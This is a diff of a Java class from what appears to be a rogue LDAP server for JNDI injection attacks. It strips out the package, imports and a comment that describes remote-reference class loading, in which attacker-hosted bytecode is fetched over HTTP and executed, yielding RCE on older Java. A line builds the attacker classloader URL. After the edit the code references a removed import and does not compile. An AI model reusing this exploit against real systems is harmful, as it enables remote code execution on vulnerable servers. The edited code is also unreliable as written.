@@ -1,29 +1,12 @@
-package artsploit.controllers;
 
-import artsploit.Config;
-import artsploit.annotations.LdapMapping;
+
 import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
 import com.unboundid.ldap.sdk.Entry;
 import com.unboundid.ldap.sdk.LDAPResult;
 import com.unboundid.ldap.sdk.ResultCode;
 
-/**
- * Classic JNDI attack. The server responds with a reference object.
- * When the reference is unpacked on the server side, if "javaFactory" class name is unknown for the server,
- *  its bytecode is loaded and executed from "http://hostname/xExportObject.class"
- *
- * Yields:
- *  RCE via remote classloading.
- *
- * @see https://www.veracode.com/blog/research/exploiting-jndi-injections-java for details
- *
- * Requires:
- * - java <8u191
- *
- * @author artsploit
- */
-@LdapMapping(uri = { "/", "/o=reference" })
-public class RemoteReference implements LdapController {
+public class RemoteReference 
+{
 
     private String classloaderUrl = "http://" + Config.hostname + ":" + Config.httpPort + "/";
 
